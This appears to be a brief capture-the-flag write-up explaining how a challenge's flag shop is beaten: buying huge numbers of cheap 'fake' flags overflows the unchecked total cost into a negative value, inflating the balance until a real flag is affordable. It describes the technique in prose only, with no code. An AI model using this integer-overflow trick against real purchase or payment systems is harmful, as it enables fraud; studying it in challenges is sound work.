The vulnerability lies in the fact that we can buy "fake" flags at a much lower cost than a real flag.
Also, there are no arithmetic overflow checks, so we can buy a large number of fake flags to overflow the cost and make it negative,
which will increase our balance.

We can do this until we have enough funds to buy a real flag.
